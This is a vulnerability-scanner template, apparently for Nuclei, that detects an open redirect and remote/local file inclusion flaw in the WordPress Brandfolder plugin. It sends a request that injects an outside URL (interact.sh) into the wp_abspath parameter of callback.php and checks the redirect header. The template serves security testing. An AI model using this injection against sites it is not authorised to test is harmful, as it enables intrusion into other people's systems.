id: brandfolder-open-redirect

info:
  name: WordPress Brandfolder - Open Redirect (RFI & LFI)
  author: 0x_Akoko
  severity: medium
  description: |
    WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.
  reference:
    - https://www.exploit-db.com/exploits/39591
    - https://wpscan.com/vulnerability/f850e182-f9c6-4264-b2b1-e587447fe4b1
  metadata:
    max-request: 1
  tags: wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)interact\.sh.*$'
# digest: 4b0a00483046022100cee690c1f491588cb7cf5da3db81de8a61fabfe176e9f9e4c4a143ac647e4ab0022100837ee27e99d358c9d71a78da8e3fae0e886dd4156de81d5a7cebe18a4ae40312:922c64590222798bb761d5b6d8e72950